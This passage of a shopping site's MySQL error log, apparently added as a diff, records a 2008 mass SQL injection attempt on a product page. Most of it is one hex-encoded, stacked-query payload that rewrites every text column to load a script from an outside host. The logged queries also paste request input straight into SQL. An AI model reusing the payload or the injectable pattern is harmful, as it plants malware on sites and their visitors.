+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+update tblProduct set p_view = p_view + 1 where p_idx = 11;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522832' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+
+select A.p_idx, B.p_e_idx, A.p_main_img
+from tblProduct A, tblProductEach B
+where 1 
+and A.p_idx = B.p_idx
+and A.p_idx != 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+and A.shop_idx = 
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 5
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11';dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--
+update tblProduct set p_view = p_view + 1 where p_idx = 11\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);--
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\';dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+
+select count(*) from tblRankProduct where 1
+and p_idx = 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\' and rp_rank > 0 and rp_rank <= 10
+and date_sub(rp_end_dt, INTERVAL 6 DAY) = rp_start_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 2
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+
+select A.*, B.p_e_idx, B.end_dt, C.shop_name, C.shop_medal, C.shop_url,
+ifnull((select rp_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_rank,
+ifnull((select rp_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_last_rank,
+ifnull((select rp_total_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_rank,
+ifnull((select rp_total_last_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rp_total_last_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as rpc_rank,
+ifnull((select rpc_rank from tblRankProduct where p_idx=A.p_idx and rp_start_dt = '2008-12-14' and rp_end_dt = '2008-12-20'),10000) as best_codi_cnt,
+ifnull((select sum(p_u_val) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val > 0),0) as up_cnt,
+ifnull((select abs(sum(p_u_val)) from tblProductUpDown where p_idx=A.p_idx and p_u_reg_dt between B.start_dt and B.end_dt and p_u_val < 0),0) as down_cnt,
+ifnull((select count(*) from tblProductComment where p_idx=A.p_idx and p_c_reg_dt between B.start_dt and B.end_dt ),0) as comment_cnt
+from tblProduct A, tblProductEach B, tblShop C
+where 1
+and A.p_idx = B.p_idx and A.shop_idx = C.shop_idx
+and A.p_idx = 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\'
+and now() between B.start_dt and B.end_dt
+
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 14
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
+filename: /product/product_view.php?p_idx=11%25'%20;dEcLaRe%20@S%20VaRcHaR(4000)%20SeT%20@s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20aS%20VaRcHaR(4000));eXeC(@s);--%20aNd%20'%25'='
+select A.*, B.shop_name, B.shop_medal, B.shop_url from tblProduct A, tblShop B where A.shop_idx = B.shop_idx and A.p_idx = 11%\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C415245204054205641524348415228323535292C404320564152434841522832353529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F5220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D20534554205B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B40432B275D29292B27273C736372697074207372633D687474703A2F2F73312E6361776A622E636F6D2F6B722E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 aS VaRcHaR(4000));eXeC(@s);-- aNd \'%\'=\'
+------------------------------------------------------------------------------------------
+1064 : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' ;dEcLaRe @S VaRcHaR(4000) SeT @s=cAsT(0x4445434C41524520405420564152434841522' at line 1
+===========================================================================================
+
+=== [2008/12/25 15:23:31] =================================================================
